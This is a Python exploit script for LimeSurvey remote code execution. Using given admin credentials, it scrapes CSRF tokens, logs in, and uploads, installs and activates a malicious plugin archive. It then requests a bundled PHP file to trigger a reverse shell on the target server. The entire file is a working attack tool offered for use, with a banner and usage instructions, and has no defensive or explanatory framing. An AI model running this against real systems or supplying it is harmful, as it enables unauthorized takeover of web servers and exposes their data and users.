#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import sys
import warnings
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
print("_______________LimeSurvey RCE_______________")
print("")
print("")
print("Usage: python exploit.py URL username password port")
print("Example: python exploit.py http://192.26.26.128 admin password 80")
print("")
print("")
print("== ██╗   ██╗ ██╗██╗     ██████╗  ██╗██████╗  ██╗███╗   ███╗ ==")
print("== ╚██╗ ██╔╝███║██║     ██╔══██╗███║██╔══██╗███║████╗ ████║ ==")
print("==  ╚████╔╝ ╚██║██║     ██║  ██║╚██║██████╔╝╚██║██╔████╔██║ ==")
print("==   ╚██╔╝   ██║██║     ██║  ██║ ██║██╔══██╗ ██║██║╚██╔╝██║ ==")
print("==    ██║    ██║███████╗██████╔╝ ██║██║  ██║ ██║██║ ╚═╝ ██║ ==")
print("==    ╚═╝    ╚═╝╚══════╝╚═════╝  ╚═╝╚═╝  ╚═╝ ╚═╝╚═╝     ╚═╝ ==")
print("")
print("")

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
port = sys.argv[4]

req = requests.session()
print("[+] Retrieving CSRF token...")
loginPage = req.get(url + "/index.php/admin/authentication/sa/login")
response = loginPage.text
s = BeautifulSoup(response, 'html.parser')
CSRF_token = s.findAll('input')[0].get("value")
print(CSRF_token)

print("[+] Sending Login Request...")
login_creds = {
    "user": username,
    "password": password,
    "authMethod": "Authdb",
    "loginlang": "default",
    "action": "login",
    "width": "1581",
    "login_submit": "login",
    "YII_CSRF_TOKEN": CSRF_token
}

login_response = req.post(url + "/index.php/admin/authentication/sa/login", data=login_creds)
if login_response.url == url + "/index.php/admin/index":
    print("[+] Login Successful")
else:
    print("[-] Login Failed. Check your credentials or the target URL.")
    sys.exit(1)

print("")
print("[+] Upload Plugin Request...")
print("[+] Retrieving CSRF token...")
filehandle = open("./Y1LD1R1M.zip", mode="rb")
UploadPage = req.get(url + "/index.php/admin/pluginmanager/sa/index")
response = UploadPage.text
s = BeautifulSoup(response, 'html.parser')
CSRF_token2 = s.findAll('input')[0].get("value")
print(CSRF_token2)

Upload_creds = {
    "YII_CSRF_TOKEN": CSRF_token2,
    "lid": "$lid",
    "action": "templateupload"
}

file_upload = req.post(url + "/index.php/admin/pluginmanager?sa=upload", files={'the_file': filehandle}, data=Upload_creds)
UploadPage = req.get(url + "/index.php/admin/pluginmanager?sa=uploadConfirm")
response = UploadPage.text
if "success" in response.lower():
    print("[+] Plugin Uploaded Successfully")
else:
    print("[-] Plugin Upload Failed. Check the file or server response.")
    sys.exit(1)

print("")
print("[+] Install Plugin Request...")
print("[+] Retrieving CSRF token...")
InstallPage = req.get(url + "/index.php/admin/pluginmanager?sa=installUploadedPlugin")
response = InstallPage.text
s = BeautifulSoup(response, 'html.parser')
CSRF_token3 = s.findAll('input')[0].get("value")
print(CSRF_token3)

Install_creds = {
    "YII_CSRF_TOKEN": CSRF_token3,
    "isUpdate": "false"
}

file_install = req.post(url + "/index.php/admin/pluginmanager?sa=installUploadedPlugin", data=Install_creds)
if "success" in file_install.text.lower():
    print("[+] Plugin Installed Successfully")
else:
    print("[-] Plugin Installation Failed. Check the response.")
    sys.exit(1)

print("")
print("[+] Activate Plugin Request...")
print("[+] Retrieving CSRF token...")
ActivatePage = req.get(url + "/index.php/admin/pluginmanager?sa=activate")
response = ActivatePage.text
s = BeautifulSoup(response, 'html.parser')
CSRF_token4 = s.findAll('input')[0].get("value")
print(CSRF_token4)

Activate_creds = {
    "YII_CSRF_TOKEN": CSRF_token4,
    "pluginId": "1"  # CHANGE THIS
}

file_activate = req.post(url + "/index.php/admin/pluginmanager?sa=activate", data=Activate_creds)
if "success" in file_activate.text.lower():
    print("[+] Plugin Activated Successfully")
else:
    print("[-] Plugin Activation Failed. Check the response.")
    sys.exit(1)

print("")
print("[+] Reverse Shell Starting, Check Your Connection ")
shell_url = url + "/upload/plugins/Y1LD1R1M/php-rev.php"  # CHANGE THIS
shell_response = req.get(shell_url)
if shell_response.status_code == 200:
    print(f"[+] Reverse Shell Executed Successfully: {shell_url}")
else:
    print(f"[-] Failed to Execute Reverse Shell. Response Code: {shell_response.status_code}")
